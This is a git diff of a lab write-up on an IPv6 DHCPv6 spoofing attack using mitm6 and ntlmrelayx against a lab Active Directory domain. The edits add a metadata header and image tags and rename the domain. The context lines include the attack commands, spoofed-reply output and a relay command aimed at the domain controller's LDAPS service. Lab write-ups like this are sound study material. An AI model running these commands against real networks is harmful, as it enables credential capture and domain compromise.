@@ -1,5 +1,11 @@
 # IPv6 Attack with mitm6
 
+**Date:** May 2026  
+**Author:** ShahinSecLab  
+**Category:** Network Attack / Credential Capture  
+**Difficulty:** Easy  
+**Tools:** Responder, Hashcat 
+
 ## Table of Contents
 1. [Overview](#overview)
 2. [Attack Theory](#attack-theory)
@@ -71,7 +77,7 @@ Domain Compromise
 | Domain Controller   | Windows Server 2019 | 192.168.5.134   |
 | Victim Workstation  | Windows 10          | 192.168.5.135   |
 
-**Domain Name:** `roadteambd.local`
+**Domain Name:** `readteambd.local`
 
 ## Tools Required
 
@@ -88,7 +94,7 @@ Domain Compromise
 Open Terminal 1. Launch mitm6 targeting the internal domain on the network interface connected to the LAN.
 
 ```bash
-sudo mitm6 -d roadteambd.local -i eth0
+sudo mitm6 -d readteambd.local -i eth0
 ```
 
 | Flag |           Meaning                 |
@@ -121,6 +127,10 @@ IPv6 address fe80::74:1 is now assigned to mac=00:50:56:c0:00:08 host=R64M. ipv4
 IPv6 address fe80::192:168:5:134 is now assigned to mac=00:0c:29:bc:6b:1e host=REDTEAMBD-DC.READTEAMBD.local. ipv4=192.168.5.134
 Sent spoofed reply for wpad.readteambd.local. to fe80::502e:c6be:1fe9:c8bf
 ```
+
+<p align="center">
+  <img src="/writeups/IPv6 Attack with mitm6/images/step1.png" width="600">
+</p>
 
 ## Step 2 — Launch ntlmrelayx:
 On another terminal
@@ -159,6 +169,10 @@ ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootm
 
 [*] Servers started, waiting for connections
 ```
+
+<p align="center">
+  <img src="/writeups/IPv6 Attack with mitm6/images/step2.png" width="600">
+</p>
 
 ## Step 3 — Trigger Authentication from Victim
 
